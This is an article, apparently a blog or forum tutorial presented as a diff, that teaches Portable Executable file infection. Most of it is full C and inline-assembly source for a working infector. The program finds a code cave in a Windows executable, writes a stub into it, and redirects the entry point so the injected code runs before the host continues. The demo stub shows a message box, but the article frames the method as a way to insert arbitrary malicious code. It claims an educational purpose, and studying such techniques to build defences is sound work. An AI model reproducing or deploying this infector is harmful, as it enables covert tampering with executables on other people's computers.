@@ -1,0 +1,276 @@
+Portable Executable file infection is a subject I always found to be sketchy. There was always a piece of the puzzle missing in my case... In this article I hope to clarify the matter and hopefully provide a good starting point for those wanting to learn how such tools work.
+
+I want to mention that I'm writing this article with an intention of educating others. You may start out with PE infection, but eventually I hope that you'll move onto authoring PE protection tools and exploiting your newly found knowledge in a positive and ethical manner. A lot can be learned during the development and implementation process of such tools.
+
+I'll mainly be using C and inline Assembler in this article and I'll assume you've at least a working knowledge of both C and Assembler.
+
+Firstly, what is a PE file? You can find out by skimming through this page:
+
+* en.wikipedia.org/wiki/Portable_Executable
+
+Secondly, what is PE infection?
+
+In my opinion PE infection is simply a method of inserting arbitrary (malicious) code into a compiled portable executable whilst maintaining the executable's normal functionality(it still appears to execute as if it had not been tampered with).
+
+Of course to infect a PE file we'll need to know about the PE file format, various documents exist on this subject, I recommend you take a look at the following before you continue reading this article.
+
+* www.microsoft.com/whdc/system/platform/firmware/PECOFF.mspx
+* msdn.microsoft.com/en-us/magazine/cc301805.aspx
+* msdn.microsoft.com/en-us/magazine/cc301808.aspx
+
+A typical PE file's layout looks like this:
+
+[MZ Header]
+
+[MZ Signature]
+
+[PE Headers]
+
+[PE Signature]
+
+[IMAGE_FILE_HEADER][IMAGE_OPTIONAL_HEADER]
+
+[Section Table]
+
+[Section 1][Section 2][Section n]
+
+I've neglected the DOS header above but it shouldn't matter too much, my goal is not to teach you the inner workings of the PE file format.
+
+Inside the IMAGE_OPTIONAL_HEADER we've pointers to various data directories, these directories usually point to Import and Relocation table's amongst other things that are contained in certain sections of the PE, we must preserve or rebuild these directories ourself should we want to destroy them... Such a case is if you encrypt a section that contains the contents of one the directories.
+
+The basic idea behind PE infection is to first insert our code into slack space, modify the original entrypoint address to point to our code, execute it, then jump back to the host's original entrypoint so the PE file executes as if our code didn't exist.
+
+Pseudo code would be similar to this:
+
+* Open target file
+* Verify MZ and PE signatures exist
+* Search for a specified length of NULL bytes starting from the beginning of the last section on disk
+* Write our stub into the newly located slack space
+* Modify our current entrypoint to point to the start of our newly inserted code
+* Close target file
+
+Now I'd like to point out that Stub construction can usually be the harder part of PE infection, as you'll find out shortly.
+
+For now let's begin with an implementation of our above Pseudo code...
+
+We need to open the file and map it(this makes for easier modifications), I'm not going to explain what each API does as MSDN can do that for you.
+
+The following snippet does this for us:
+
+// PE Infecter by KOrUPt
+#include 
+#include 
+ 
+#define bb(x) __asm _emit x
+ 
+__declspec(naked) void StubStart()
+{
+    __asm{
+        pushad  // preserve our thread context
+        call GetBasePointer
+        GetBasePointer: 
+        pop ebp
+        sub ebp, offset GetBasePointer // delta offset trick. Think relative...
+         
+        push MB_OK
+        lea  eax, [ebp+szTitle]
+        push eax
+        lea  eax, [ebp+szText]
+        push eax
+        push 0
+        mov  eax, 0xCCCCCCCC
+        call eax
+     
+        popad   // restore our thread context
+        push 0xCCCCCCCC // push address of orignal entrypoint(place holder)
+        retn    // retn used as jmp
+         
+        szText:
+            bb('H') bb('e') bb('l') bb('l') bb('o') bb(' ') bb('W') bb('o') bb('r') bb('l') bb('d')
+            bb(' ') bb('f') bb('r') bb('o') bb('m') bb(' ') bb('K') bb('O') bb('r') bb('U') bb('P') bb('t') bb(0)        
+        szTitle:
+            bb('O') bb('h') bb('a') bb('i') bb(0)
+         
+    }
+}
+void StubEnd(){}
+ 
+// By Napalm
+DWORD FileToVA(DWORD dwFileAddr, PIMAGE_NT_HEADERS pNtHeaders)
+{
+    PIMAGE_SECTION_HEADER lpSecHdr = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeaders + sizeof(IMAGE_NT_HEADERS));
+    for(WORD wSections = 0; wSections < pNtHeaders->FileHeader.NumberOfSections; wSections++){
+        if(dwFileAddr >= lpSecHdr->PointerToRawData){
+            if(dwFileAddr < (lpSecHdr->PointerToRawData + lpSecHdr->SizeOfRawData)){
+                dwFileAddr -= lpSecHdr->PointerToRawData;
+                dwFileAddr += (pNtHeaders->OptionalHeader.ImageBase + lpSecHdr->VirtualAddress);
+                return dwFileAddr; 
+            }
+        }
+        
+        lpSecHdr++;
+    }
+     
+    return NULL;
+}
+ 
+int main(int argc, char* argv[]) 
+{    
+    PIMAGE_DOS_HEADER pDosHeader;
+    PIMAGE_NT_HEADERS pNtHeaders;
+    PIMAGE_SECTION_HEADER pSection, pSectionHeader;
+    HANDLE hFile, hFileMap;
+    HMODULE hUser32;
+    LPBYTE hMap;
+ 
+    int i = 0, charcounter = 0;
+    DWORD oepRva = 0, oep = 0, fsize = 0, writeOffset = 0, oepOffset = 0, callOffset = 0;
+    unsigned char *stub;
+     
+    // work out stub size
+    DWORD start  = (DWORD)StubStart;
+    DWORD end    = (DWORD)StubEnd;
+    DWORD stubLength = (end - start);
+     
+    if(argc != 2){
+        printf("Usage: %s [file]\n", argv[0]);
+        return 0;
+    }
+     
+    // map file
+    hFile = CreateFile(argv[1], GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 
+                        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if(hFile == INVALID_HANDLE_VALUE){
+        printf("[-] Cannot open %s\n", argv[1]);
+        return 0;
+    }
+     
+    fsize = GetFileSize(hFile, 0);
+    if(!fsize){
+        printf("[-] Could not get files size\n");
+        CloseHandle(hFile);
+        return 0;
+    }
+     
+    hFileMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, fsize, NULL);
+    if(!hFileMap){
+        printf("[-] CreateFileMapping failed\n");
+        CloseHandle(hFile);
+        return 0;
+    }
+ 
+    hMap = (LPBYTE)MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS, 0, 0, fsize);
+    if(!hMap){
+        printf("[-] MapViewOfFile failed\n");
+        CloseHandle(hFileMap);
+        CloseHandle(hFile);
+        return 0;
+    }
+     
+    // check signatures
+    pDosHeader = (PIMAGE_DOS_HEADER)hMap;
+    if(pDosHeader->e_magic != IMAGE_DOS_SIGNATURE){
+        printf("[-] DOS signature not found\n");
+        goto cleanup;
+    }
+     
+    pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD)hMap + pDosHeader->e_lfanew);
+    if(pNtHeaders->Signature != IMAGE_NT_SIGNATURE){
+        printf("[-] NT signature not found\n");
+        goto cleanup;
+    }
+     
+    // get last section's header...
+    pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)hMap + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
+    pSection = pSectionHeader;
+    pSection += (pNtHeaders->FileHeader.NumberOfSections - 1);
+     
+    // save entrypoint
+    oep = oepRva = pNtHeaders->OptionalHeader.AddressOfEntryPoint;
+    oep += (pSectionHeader->PointerToRawData) - (pSectionHeader->VirtualAddress);
+     
+    // locate free space
+    i = pSection->PointerToRawData;
+    for(; i != fsize; i++){
+        if((char *)hMap[i] == 0x00){
+            if(charcounter++ == stubLength + 24){
+                printf("[+] Code cave located @ 0x%08lX\n", i);
+                writeOffset = i;
+            }
+        }else charcounter = 0;
+    }
+ 
+    if(charcounter == 0 || writeOffset == 0){
+        printf("[-] Could not locate a big enough code cave\n");
+        goto cleanup;
+    }
+     
+    writeOffset -= stubLength;
+     
+    stub = (unsigned char *)malloc(stubLength + 1);
+    if(!stub){
+        printf("[-] Error allocating sufficent memory for code\n");
+        goto cleanup;
+    }
+     
+    // copy stub into a buffer
+    memcpy(stub, StubStart, stubLength);
+     
+    // locate offsets of place holders in code
+    for(i = 0, charcounter = 0; i != stubLength; i++){
+        if(stub[i] == 0xCC){
+            charcounter++;
+            if(charcounter == 4 && callOffset == 0)
+                callOffset = i - 3;
+            else if(charcounter == 4 && oepOffset == 0)
+                oepOffset = i - 3;
+        }else charcounter = 0;
+    }
+     
+    // check they're valid
+    if(oepOffset == 0 || callOffset == 0){
+        free(stub);
+        goto cleanup;
+    }
+     
+    hUser32 = LoadLibrary("User32.dll");
+    if(!hUser32){
+        free(stub);
+        printf("[-] Could not load User32.dll");
+        goto cleanup;
+    }
+     
+    // fill in place holders
+    *(u_long *)(stub + oepOffset) = (oepRva + pNtHeaders->OptionalHeader.ImageBase);
+    *(u_long *)(stub + callOffset) = ((DWORD)GetProcAddress(hUser32, "MessageBoxA"));
+    FreeLibrary(hUser32);
+     
+    // write stub
+    memcpy((PBYTE)hMap + writeOffset, stub, stubLength);
+     
+    // set entrypoint
+    pNtHeaders->OptionalHeader.AddressOfEntryPoint = 
+        FileToVA(writeOffset, pNtHeaders) - pNtHeaders->OptionalHeader.ImageBase;
+     
+    // set section size
+    pSection->Misc.VirtualSize += stubLength;
+    pSection->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
+     
+    // cleanup
+    printf("[+] Stub written!!\n[*] Cleaning up\n");
+    free(stub);
+     
+    cleanup:
+    FlushViewOfFile(hMap, 0);
+    UnmapViewOfFile(hMap);
+     
+    SetFilePointer(hFile, fsize, NULL, FILE_BEGIN);
+    SetEndOfFile(hFile);
+    CloseHandle(hFileMap);
+    CloseHandle(hFile);
+    return 0;
+}
+
+And I think that just about covers this article for now... I hope you enjoyed reading it. I look forward to reading your comments and reviews on this topic.
+
+KOrUPt. 
